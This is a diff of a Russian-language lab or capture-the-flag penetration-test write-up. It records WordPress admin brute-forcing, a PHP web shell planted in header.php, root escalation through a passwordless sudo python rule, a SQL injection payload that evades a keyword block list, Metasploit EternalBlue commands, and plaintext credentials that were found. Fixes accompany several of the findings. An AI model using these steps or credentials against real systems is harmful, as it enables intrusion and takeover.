@@ -484,11 +484,15 @@ Interesting Finding(s):
 [i] No plugins Found.
 ```
 
-# Получение админских привелегий на Wordpress
+---
+
+## Получение админских привелегий на Wordpress
 
 Заходим на http://10.31.2.10/wp-scan и пробуем брутить логин\пароль. Подходит логин `admin` и пароль `admin`. 
 Заходим в админку и выбираем Appearence -> Theme File Editor и открываем header.php.
+
 Вставляем `echo system($_REQUEST['lol'])`, чтобы получить Remote Code Execution в системе.
+
 ![](https://i.imgur.com/2IcJHFB.png)
 
 И теперь получаем reverse shell:
@@ -497,11 +501,13 @@ Interesting Finding(s):
 
 Возможный фикс: сменить пароль и логин в админке Вордпресса на более безопасный, используя большие и маленькие буквы, специальные символы(`$`, `'` и тп) и цифры. Например, логин - `MasterVan`, пароль - `G00dM^rn1ngSl$v3$$` 
 
-# Privilege escalation on wordpress server
+## Privilege escalation on wordpress server
 Запустим `python -c 'import pty; pty.spawn("/bin/bash")'` , чтобы получить bash. 
 Теперь нужно поднять привелегии до root:
+
 1) Запустим `cat /etc/sudoers` , чтобы получить список исполнуяемых файлов, которые могут быть запущены из под рута без введения пароля. Такой находится: `www-data ALL=(ALL:ALL) NOPASSWD: /usr/bin/python` (www-data - user, под которым мы находимся сейчас). 
 3) Запустим `sudo /usr/bin/python` , пароля от нас не требуют. Сменим пароль для пользователя root:
+
 ```python
 >>> import os
 >>> os.system('id')
@@ -511,6 +517,7 @@ New password: aboba
 passwd: password changed successfully
 >>> exit()
 ```
+
 > Позднее заменим пароль на более безопастный
 
 3) Запускаем `su`, вводим новый пароль для рута (aboba) и получаем shell от пользователя root.
@@ -521,3 +528,104 @@ passwd: password changed successfully
 > Позже запретим подключение по SSH к руту строчкой `PermitRootLogin no`, так как это рождает уязвимость
 
 ---
+
+## Найденные на сервере уязвимости
+
+### Sql injection
+
+В `/home/user/SolarApp_back/app.py` присутствует данный фрагмент кода:
+
+```python
+ 
+con = pymysql.connect(
+    host='localhost',
+    user='root',
+    password='root',
+    db='counter_information',
+    charset='utf8mb4',
+    cursorclass=pymysql.cursors.DictCursor
+)
+        def check_sql(region):
+            vuln = ["select", "SELECT", "union", "UNION", "from", "FROM", " ", "  "]
+            for v in vuln:
+                if region.find(v) >=0:
+                    error = True
+                    message="Forbidden construct detected: '"+v+"'"
+                    return error, message
+            return False, ''    
+         
+        @app.route('/check_price', methods=['GET', 'POST'])
+        def check_price():
+            region = request.form['region_name']
+            error, message = check_sql(region)
+            if error:
+                return render_template('index.html', error=error, message=message)
+            cur = con.cursor()
+            query = 'select counter_price from counter_cost where districtID LIKE \'' + region + '\';'
+            try:
+                cur.execute(query)
+                rows = cur.fetchall()
+                ...
+            except:
+                ...
+```
+
+Мы можем достать данные из базы данных с помощью sql инъекции. Пейлоад может быть примерно таким : `kkk'/**/uNIon/**/seLEct/**/213--'`
+
+Возможный фикс:
+
+```python
+query = 'select counter_price from counter_cost where districtID LIKE %s;'
+try:
+    cur.execute(query, ['%'+region+'%'])
+except:
+    ...
+```
+
+Вторая уязвимость состоит в том, что пароль для базы данных слабый, его нужно сменить на более безопасный.
+
+### Sql database dump
+
+В `home/cadm/dump.sql` лежит дамп базы данных с логинами, почтами, телефонами, незахешированными паролями и другими конфиденциальными данными. 
+Возможный фикс: Провести миграцию для хэширования паролей, дамп удалить.
+
+---
+
+## Eternal blue
+С помощью `nmap --script smb-vuln* -p 139,445 <ip>` ,
+Всего найдено 5 уязвимых к EternalBlue(CVE-2017-0143) айпи:
+```
+10.31.2.12 - DMZ
+10.31.4.8 - Office
+10.31.239.5 - АСУ ТП 1
+10.31.239.6 - АСУ ТП 1
+10.31.240.14 - АСУ ТП 2
+```
+На данных ip можем получить шелл, введя в metasploit
+```
+use windows/smb/ms17_010_eternalblue
+set RHOST ip
+exploit
+```
+
+## 10.31.239.6
+
+* Были найдены зашифрованные файлы (и зашифрованный флаг)
+* Также найден рансомвар шифрователь, нужно было найти аес ключ, но мы не нашли =)
+* На рабочем столе ярлык для подключения к "НТК система", не удалось разобраться с подключением к ней.
+
+## 10.31.239.5
+
+* Запущен какой-то сервер для программы на `10.31.239.6`, был найден словарь для брута паролей, в логах обнаружены дествия с аккаунтом админа
+
+## 10.31.2.12
+
+* Запущен почтовый клиент `SLmail`, мы пробовали найти/получать письма, но не смогли. Доступ к панели админа был получен, но это не принесло никаких плодов.
+
+## Найденные логины/пароли
+
+* oper:america#1
+* Администратор:Jonathan1
+
+> Подключались по рдп к каждому из серверов, тыкали в разные файлики, смотретили клип `невер гона гив ю ап`
+
